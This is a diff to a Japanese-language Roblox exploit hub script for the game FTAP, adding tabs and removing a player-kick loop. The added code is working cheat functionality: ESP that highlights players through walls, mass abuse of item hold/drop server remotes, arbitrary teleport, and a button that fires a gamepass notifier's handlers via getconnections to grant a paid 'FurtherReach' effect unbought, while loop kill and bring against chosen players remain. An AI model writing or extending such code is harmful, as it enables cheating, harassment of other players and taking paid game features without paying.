+        antiInputLagToy = ToyList[Value] or "FoodCoconut"
+    end
+})
+
+InvincibilityTab:AddToggle({
+    Name = "Remove Anti Input Lag",
+    Default = false,
+    Color = Blue,
+    Callback = function(value)
+        InvSettings.antiInputLag = value
+        if value then
+            startAntiInputLag()
+            OrionLib:MakeNotification({
+                Name = "Anti Input Lag",
+                Content = "有効化されました (アイテム: " .. antiInputLagToy .. ")",
+                Time = 3
+            })
+        else
+            antiInputLagRunning = false
+            OrionLib:MakeNotification({
+                Name = "Anti Input Lag",
+                Content = "無効化されました",
+                Time = 2
+            })
+        end
+    end
+})
+
+InvincibilityTab:AddParagraph("📝 Anti Input Lag 説明", 
+    "・選択したアイテムを高速で持ち→落としを繰り返します\n" ..
+    "・これによりネットワークの処理を軽減し入力遅延を軽減します\n" ..
+    "・アイテムはドロップダウンで変更可能\n" ..
+    "・効果は環境によって異なります"
+)
+
+-- ★★★ アンチブロキルセクション ★★★
+InvincibilityTab:AddSection({ Name = "アンチブロキル" })
+
+InvincibilityTab:AddToggle({
+    Name = "アンチブロキル (強力)",
+    Default = false,
+    Color = Blue,
+    Callback = function(value)
+        InvSettings.antiBlokill = value
+        if value then
+            startAntiBlokill()
+            OrionLib:MakeNotification({
+                Name = "アンチブロキル",
+                Content = "有効化されました！",
+                Time = 3
+            })
+        else
+            AB_AntiGrabProc = false
+            AB_AGWalk = false
+            OrionLib:MakeNotification({
+                Name = "アンチブロキル",
+                Content = "無効化されました",
+                Time = 2
+            })
+        end
+    end
+})
+
+InvincibilityTab:AddParagraph("📝 アンチブロキル説明", 
+    "・ブロブマンによるキル攻撃を強力に防ぎます\n" ..
+    "・掴まれた際に自動でStruggleとRagdollRemoteを連打\n" ..
+    "・BallSocketConstraintを無効化しラグドール状態を防止\n" ..
+    "・WeldHRPによる拘束も自動解除します\n" ..
+    "・他のアンチ機能と併用可能です"
+)
+
 InvincibilityTab:AddParagraph("説明", 
     "・アンチグラブ: 掴まれた時に自動抵抗\n" ..
     "・アンチ火傷: 火ダメージを無効化\n" ..
@@ -3228,7 +3288,8 @@ InvincibilityTab:AddParagraph("説明",
     "・アンチキック: キック攻撃を無効化\n" ..
     "・アンチラグドール: ラグドール状態を防止\n" ..
     "・アンチペイント: ペイント攻撃を無効化\n" ..
-    "・GUCCIアンチ: 最強のアンチグラブ"
+    "・GUCCIアンチ: 最強のアンチグラブ\n" ..
+    "・アンチブロキル: ブロブマンキルを強力に防御"
 )
 
 -- ──────────────────────────────────────
@@ -3661,7 +3722,7 @@ GrabTab:AddParagraph("使い方",
 )
 
 -- ──────────────────────────────────────
--- Loop Tab
+-- Loop Tab (キック関連を削除)
 -- ──────────────────────────────────────
 local LoopTab = Window:MakeTab({
     Name = "ループ",
@@ -3672,7 +3733,6 @@ local LoopTab = Window:MakeTab({
 local loopSelectedPlayers = {}
 local isKilling = false
 local isBringing = false
-local isKicking = false
 local loopNoclipConnection = nil
 local loopNoclipping = false
 
@@ -3769,10 +3829,6 @@ local function IsValidTarget(player)
     return false
 end
 
-local function IsValidKickTarget(player)
-    return IsValidTarget(player)
-end
-
 local function KillPlayer(targetPlayer)
     if not IsValidTarget(targetPlayer) then return end
     local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -3834,38 +3890,6 @@ local function BringPlayer(targetPlayer)
     
     DisableLoopNoclip()
     TeleportPlayerLoop(initialPos)
-end
-
-local function KickPlayerLoop(targetPlayer)
-    if not IsValidKickTarget(targetPlayer) then return end
-    local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not root then return end
-    
-    local initialPos = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and LP.Character.HumanoidRootPart.CFrame
-    
-    for i = 0, 50 do
-        EnableLoopNoclip()
-        SNOWship(root)
-        if not IsValidKickTarget(targetPlayer) or not isKicking then
-            CreateSkyVelocity(root)
-            pcall(function() DestroyGrabLine:FireServer(root) end)
-            break
-        end
-        if CheckNetworkOwnership(targetPlayer) or root.AssemblyLinearVelocity.Magnitude > 500 then
-            CreateSkyVelocity(root)
-            pcall(function() DestroyGrabLine:FireServer(root) end)
-            break
-        end
-        task.wait()
-        if root.Position.Y <= -12 then
-            TeleportPlayerLoop(CFrame.new(root.Position + Vector3.new(0, 5, -15)))
-        else
-            TeleportPlayerLoop(CFrame.new(root.Position + Vector3.new(0, -10, -10)))
-        end
-    end
-    
-    DisableLoopNoclip()
-    if initialPos then TeleportPlayerLoop(initialPos) end
 end
 
 local function UpdateLoopPlayerList()
@@ -4011,48 +4035,7 @@ LoopTab:AddButton({
     end
 })
 
-LoopTab:AddSection({ Name = "キック設定" })
-
-LoopTab:AddToggle({
-    Name = "選択プレイヤーをキック",
-    Default = false,
-    Color = Blue,
-    Callback = function(value)
-        isKicking = value
-        if value then
-            task.spawn(function()
-                while isKicking do
-                    for i = #loopSelectedPlayers, 1, -1 do
-                        if not isKicking then break end
-                        local playerName = loopSelectedPlayers[i]
-                        local targetPlayer = Players:FindFirstChild(playerName)
-                        if targetPlayer then
-                            if IsValidKickTarget(targetPlayer) then KickPlayerLoop(targetPlayer) end
-                        else
-                            table.remove(loopSelectedPlayers, i)
-                            UpdateLoopSelectedList()
-                        end
-                    end
-                    task.wait(0.2)
-                end
-            end)
-        end
-    end
-})
-
-LoopTab:AddButton({
-    Name = "1回だけキック",
-    Color = Blue,
-    Callback = function()
-        for _, playerName in ipairs(loopSelectedPlayers) do
-            local targetPlayer = Players:FindFirstChild(playerName)
-            if targetPlayer and IsValidKickTarget(targetPlayer) then
-                KickPlayerLoop(targetPlayer)
-                task.wait(0.5)
-            end
-        end
-    end
-})
+-- ★ キック設定は削除 ★
 
 Players.PlayerAdded:Connect(function()
     task.wait(0.5)
@@ -4072,13 +4055,13 @@ end)
 
 LoopTab:AddParagraph("使い方", 
     "・左側のドロップダウンからプレイヤーを選択して追加\n" ..
-    "・選択したプレイヤーに対して連続でキル/引き寄せ/キックを実行\n" ..
+    "・選択したプレイヤーに対して連続でキル/引き寄せを実行\n" ..
     "・各機能のトグルをONにすると自動でループ実行\n" ..
     "・「1回だけ」ボタンで単発実行も可能"
 )
 
 -- ──────────────────────────────────────
--- Teleport Tab
+-- Teleport Tab (手動座標テレポート追加)
 -- ──────────────────────────────────────
 local TeleportTab = Window:MakeTab({
     Name = "テレポート",
@@ -4187,10 +4170,516 @@ TeleportTab:AddButton({
     end
 })
 
+-- ===== 手動座標テレポート（追加） =====
+TeleportTab:AddSection({ Name = "手動座標テレポート" })
+
+local customX = 0
+local customY = 0
+local customZ = 0
+
+TeleportTab:AddTextbox({
+    Name = "X 座標",
+    Default = "0",
+    TextDisappear = false,
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            customX = num
+        else
+            OrionLib:MakeNotification({
+                Name = "エラー",
+                Content = "有効な数値を入力してください",
+                Time = 2
+            })
+        end
+    end
+})
+
+TeleportTab:AddTextbox({
+    Name = "Y 座標",
+    Default = "0",
+    TextDisappear = false,
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            customY = num
+        else
+            OrionLib:MakeNotification({
+                Name = "エラー",
+                Content = "有効な数値を入力してください",
+                Time = 2
+            })
+        end
+    end
+})
+
+TeleportTab:AddTextbox({
+    Name = "Z 座標",
+    Default = "0",
+    TextDisappear = false,
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            customZ = num
+        else
+            OrionLib:MakeNotification({
+                Name = "エラー",
+                Content = "有効な数値を入力してください",
+                Time = 2
+            })
+        end
+    end
+})
+
+TeleportTab:AddButton({
+    Name = "🚀 座標にテレポート",
+    Color = Blue,
+    Callback = function()
+        local pos = Vector3.new(customX, customY, customZ)
+        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
+            LP.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+            OrionLib:MakeNotification({
+                Name = "テレポート完了",
+                Content = string.format("X: %.2f, Y: %.2f, Z: %.2f に移動しました", customX, customY, customZ),
+                Time = 3
+            })
+        else
+            OrionLib:MakeNotification({
+                Name = "エラー",
+                Content = "キャラクターが見つかりません",
+                Time = 2
+            })
+        end
+    end
+})
+
+TeleportTab:AddParagraph("📝 使い方", 
+    "・上記の3つのボックスに座標を入力\n" ..
+    "・例: X=0, Y=50, Z=0 → 上空50にテレポート\n" ..
+    "・「🚀 座標にテレポート」を押すと移動"
+)
+
 TeleportTab:AddParagraph("使い方", 
     "・ボタンを押すと即座にその場所にテレポートします\n" ..
     "・各色の家はFTAPのプロットに対応しています\n" ..
     "・テレポート後は現在地が通知されます"
+)
+
+-- ──────────────────────────────────────
+-- アイテム操り1 (一括操作)
+-- ──────────────────────────────────────
+local ItemControl1Tab = Window:MakeTab({
+    Name = "アイテム操り1",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Item Control Center 機能 (一括操作)
+local function getCharItem()
+    return Workspace:FindFirstChild(LP.Name .. "_sub") or Workspace:FindFirstChild(LP.Name) or LP.Character
+end
+
+local function getAllItems()
+    local items = {}
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("RemoteFunction") and obj.Name == "HoldItemRemoteFunction" then
+            local holdPart = obj.Parent
+            if holdPart and holdPart.Name == "HoldPart" then
+                local item = holdPart.Parent
+                if item then
+                    table.insert(items, {
+                        Name = item.Name,
+                        Object = item,
+                        Remote = obj,
+                        DropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
+                    })
+                end
+            end
+        end
+    end
+    return items
+end
+
+local function useItemRemote(itemObj)
+    local UseRemote = ReplicatedStorage:FindFirstChild("HoldEvents") and ReplicatedStorage.HoldEvents:FindFirstChild("Use")
+    if UseRemote then UseRemote:FireServer(itemObj) end
+end
+
+ItemControl1Tab:AddSection({ Name = "一括操作" })
+
+ItemControl1Tab:AddButton({
+    Name = "全て持つ",
+    Callback = function()
+        for _, item in pairs(getAllItems()) do
+            item.Remote:InvokeServer(item.Object, getCharItem())
+            task.wait(0.1)
+        end
+    end
+})
+
+ItemControl1Tab:AddButton({
+    Name = "全て使う",
+    Callback = function()
+        for _, item in pairs(getAllItems()) do
+            useItemRemote(item.Object)
+            task.wait(0.1)
+        end
+    end
+})
+
+ItemControl1Tab:AddButton({
+    Name = "全て落とす",
+    Callback = function()
+        for _, item in pairs(getAllItems()) do
+            if item.DropRemote then
+                local dropPos = getCharItem().HumanoidRootPart.CFrame * CFrame.new(0, 300, 0)
+                item.DropRemote:InvokeServer(item.Object, dropPos, Vector3.new(0, 300, 0))
+            end
+            task.wait(0.1)
+        end
+    end
+})
+
+ItemControl1Tab:AddButton({
+    Name = "持つ → 落とす (一括)",
+    Callback = function()
+        for _, item in pairs(getAllItems()) do
+            item.Remote:InvokeServer(item.Object, getCharItem())
+            task.wait(0.2)
+            if item.DropRemote then
+                local dropPos = getCharItem().HumanoidRootPart.CFrame * CFrame.new(0, 300, 0)
+                item.DropRemote:InvokeServer(item.Object, dropPos, Vector3.new(0, 300, 0))
+            end
+        end
+    end
+})
+
+-- ──────────────────────────────────────
+-- アイテム操り2 (個別操作)
+-- ──────────────────────────────────────
+local ItemControl2Tab = Window:MakeTab({
+    Name = "アイテム操り2",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local itemIndex = 1
+
+ItemControl2Tab:AddSection({ Name = "個別操作" })
+
+ItemControl2Tab:AddSlider({
+    Name = "アイテム番号選択",
+    Min = 1, Max = 100, Default = 1, Increment = 1,
+    ValueName = "No.",
+    Callback = function(Value) itemIndex = Value end
+})
+
+ItemControl2Tab:AddButton({
+    Name = "選択した番号を持つ",
+    Callback = function()
+        local items = getAllItems()
+        if items[itemIndex] then items[itemIndex].Remote:InvokeServer(items[itemIndex].Object, getCharItem()) end
+    end
+})
+
+ItemControl2Tab:AddButton({
+    Name = "選択した番号を落とす",
+    Callback = function()
+        local items = getAllItems()
+        if items[itemIndex] and items[itemIndex].DropRemote then
+            local dropPos = getCharItem().HumanoidRootPart.CFrame * CFrame.new(0, 300, 0)
+            items[itemIndex].DropRemote:InvokeServer(items[itemIndex].Object, dropPos, Vector3.new(0, 300, 0))
+        end
+    end
+})
+
+ItemControl2Tab:AddParagraph("📝 使い方", 
+    "・スライダーでアイテム番号を選択\n" ..
+    "・「持つ」または「落とす」ボタンで操作\n" ..
+    "・アイテム番号はアイテム操り1タブの「全て持つ」などで確認可能"
+)
+
+-- ──────────────────────────────────────
+-- ★★★ ESP「エスパー」タブ ★★★
+-- ──────────────────────────────────────
+local ESPTab = Window:MakeTab({
+    Name = "エスパー",
+    Icon = "rbxassetid://7733774602",
+    PremiumOnly = false
+})
+
+-- ===== ESPハイライト用 =====
+local espCharFolder = Instance.new("Model", workspace)
+espCharFolder.Name = "ESP_Characters"
+local highlightESP = Instance.new("Highlight")
+highlightESP.Enabled = true
+highlightESP.Parent = espCharFolder
+
+local espHighlightSection = ESPTab:AddSection({ Name = "ハイライト" })
+
+espHighlightSection:AddToggle({
+    Name = "ハイライト ESP",
+    Default = false,
+    Color = Blue,
+    Callback = function(value)
+        _G.ESP_Highlight = value
+        if value then
+            highlightESP.Parent = espCharFolder
+            local function moveCharToFolder(player)
+                if player ~= LP and player.Character then
+                    player.Character.Parent = espCharFolder
+                end
+            end
+            local function updateAll()
+                for _, plr in pairs(Players:GetPlayers()) do
+                    moveCharToFolder(plr)
+                end
+            end
+            updateAll()
+            while _G.ESP_Highlight do
+                updateAll()
+                task.wait(2)
+            end
+            highlightESP.Parent = nil
+        else
+            highlightESP.Parent = nil
+        end
+    end
+})
+
+espHighlightSection:AddColorpicker({
+    Name = "塗り色",
+    Default = Color3.fromRGB(255, 0, 0),
+    Callback = function(color)
+        highlightESP.FillColor = color
+    end
+})
+
+espHighlightSection:AddSlider({
+    Name = "塗り透明度",
+    Min = 0, Max = 1, Default = 0.5, Increment = 0.05,
+    Color = Blue,
+    Callback = function(value)
+        highlightESP.FillTransparency = value
+    end
+})
+
+espHighlightSection:AddColorpicker({
+    Name = "輪郭色",
+    Default = Color3.fromRGB(255, 0, 0),
+    Callback = function(color)
+        highlightESP.OutlineColor = color
+    end
+})
+
+espHighlightSection:AddSlider({
+    Name = "輪郭透明度",
+    Min = 0, Max = 1, Default = 0.5, Increment = 0.05,
+    Color = Blue,
+    Callback = function(value)
+        highlightESP.OutlineTransparency = value
+    end
+})
+
+espHighlightSection:AddDropdown({
+    Name = "表示モード",
+    Default = "常に表示",
+    Options = {"常に表示", "遮蔽時のみ"},
+    Callback = function(value)
+        highlightESP.DepthMode = (value == "常に表示") and Enum.HighlightDepthMode.AlwaysOnTop or Enum.HighlightDepthMode.Occluded
+    end
+})
+
+-- ===== ESPアイコン用 =====
+local espIconSection = ESPTab:AddSection({ Name = "アイコン" })
+
+local function createIconTemplate()
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "ESP_Icon"
+    billboard.Size = UDim2.new(3, 50, 3, 45)
+    billboard.AlwaysOnTop = true
+    billboard.ExtentsOffset = Vector3.new(0, 10, 0)
+    billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    local imageBtn = Instance.new("ImageButton")
+    imageBtn.Name = "UserImage"
+    imageBtn.Parent = billboard
+    imageBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+    imageBtn.Size = UDim2.new(0.5, 5, 0.5, 5)
+    imageBtn.Position = UDim2.new(0.5, 0, 0.3, 0)
+    imageBtn.BackgroundTransparency = 1
+    imageBtn.Image = ""
+    imageBtn.BorderSizePixel = 0
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(2, 0)
+    corner.Parent = imageBtn
+    
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Name = "Username"
+    nameLabel.Parent = billboard
+    nameLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    nameLabel.Position = UDim2.new(0.5, 0, 0.76, 0)
+    nameLabel.Size = UDim2.new(1, 5, 0.34, 5)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nameLabel.TextScaled = true
+    nameLabel.TextSize = 35
+    nameLabel.Font = Enum.Font.SourceSans
+    nameLabel.TextWrapped = true
+    nameLabel.TextStrokeTransparency = 0
+    nameLabel.Text = ""
+    
+    local sizeConstraint = Instance.new("UITextSizeConstraint")
+    sizeConstraint.MaxTextSize = 35
+    sizeConstraint.MinTextSize = 15
+    sizeConstraint.Parent = nameLabel
+    
+    local aspect = Instance.new("UIAspectRatioConstraint")
+    aspect.AspectRatio = 1.043
+    aspect.Parent = billboard
+    
+    return billboard
+end
+
+local iconTemplate = createIconTemplate()
+
+local function createIconOnPlayer(player)
+    if player == LP then return end
+    if not player.Character then return end
+    local head = player.Character:FindFirstChild("Head")
+    if not head then return end
+    if player.Character:FindFirstChild("ESP_Icon") then return end
+    
+    local icon = iconTemplate:Clone()
+    icon.Parent = player.Character
+    icon.Adornee = head
+    icon.Username.Text = player.DisplayName or player.Name
+    
+    local success, result = pcall(function()
+        return game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=png")
+    end)
+    if success and result then
+        local data = game:GetService("HttpService"):JSONDecode(result)
+        if data and data.data and data.data[1] and data.data[1].imageUrl then
+            icon.UserImage.Image = data.data[1].imageUrl
+        end
+    end
+end
+
+local espIconConnections = {}
+local espIconPlayerAdded = nil
+local espIconActive = false
+
+espIconSection:AddToggle({
+    Name = "アイコン ESP",
+    Default = false,
+    Color = Blue,
+    Callback = function(value)
+        espIconActive = value
+        if value then
+            -- 既存プレイヤーにアイコン追加
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= LP then
+                    if plr.Character then
+                        createIconOnPlayer(plr)
+                    end
+                    espIconConnections[#espIconConnections + 1] = plr.CharacterAdded:Connect(function()
+                        createIconOnPlayer(plr)
+                    end)
+                end
+            end
+            
+            -- 新規プレイヤー追加時の監視
+            espIconPlayerAdded = Players.PlayerAdded:Connect(function(plr)
+                if plr ~= LP then
+                    espIconConnections[#espIconConnections + 1] = plr.CharacterAdded:Connect(function()
+                        createIconOnPlayer(plr)
+                    end)
+                end
+            end)
+            
+            -- アイコン維持ループ
+            task.spawn(function()
+                while espIconActive do
+                    for _, plr in pairs(Players:GetPlayers()) do
+                        if plr ~= LP and plr.Character and not plr.Character:FindFirstChild("ESP_Icon") then
+                            createIconOnPlayer(plr)
+                        end
+                    end
+                    task.wait(1)
+                end
+            end)
+        else
+            -- 全アイコン削除
+            for _, model in pairs(Workspace:GetDescendants()) do
+                if model:IsA("Model") and model:FindFirstChild("ESP_Icon") then
+                    model.ESP_Icon:Destroy()
+                end
+            end
+            for _, conn in pairs(espIconConnections) do
+                if conn and conn.Connected then conn:Disconnect() end
+            end
+            espIconConnections = {}
+            if espIconPlayerAdded then
+                espIconPlayerAdded:Disconnect()
+                espIconPlayerAdded = nil
+            end
+        end
+    end
+})
+
+espIconSection:AddParagraph("説明", 
+    "・ハイライトESP: プレイヤーの輪郭を色付けして表示\n" ..
+    "・アイコンESP: プレイヤーの頭上に名前とプロフィール画像を表示"
+)
+
+-- ──────────────────────────────────────
+-- ★★★ 「線」タブ (FurtherReach) ★★★
+-- ──────────────────────────────────────
+local LineTab = Window:MakeTab({
+    Name = "線",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+LineTab:AddSection({ Name = "Further Reach" })
+
+LineTab:AddParagraph("📌 説明", 
+    "・FurtherReach（さらに遠くへ）機能を有効化します\n" ..
+    "・ボタンを押すと即座に適用されます"
+)
+
+LineTab:AddButton({
+    Name = "🚀 FurtherReach 有効化",
+    Color = Blue,
+    Callback = function()
+        pcall(function()
+            -- FurtherReach スクリプトを実行
+            local Reach = Instance.new("BoolValue")
+            Reach.Name = "FartherReach"
+            Reach.Parent = game.Players.LocalPlayer
+            Reach.Value = true
+
+            local Notifier = game.ReplicatedStorage.GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier")
+            if Notifier then
+                for _, connection in ipairs(getconnections(Notifier.OnClientEvent)) do
+                    pcall(connection.Function)
+                end
+            end
+            
+            OrionLib:MakeNotification({
+                Name = "FurtherReach",
+                Content = "有効化されました！",
+                Time = 3
+            })
+        end)
+    end
+})
+
+LineTab:AddParagraph("⚠️ 注意", 
+    "・この機能はゲームパス購入者と同じ効果を付与します\n" ..
+    "・効果が反映されない場合は再実行してください"
 )
 
 -- ──────────────────────────────────────
@@ -4241,6 +4730,6 @@ OrionLib:Init()
 
 OrionLib:MakeNotification({
     Name = "Hub Loaded",
-    Content = "全11タブ + ブロブマンタブにオーラキル機能を追加！(Auto Kick削除済み)",
+    Content = "名募はぶへようこそ！",
     Time = 6
 })
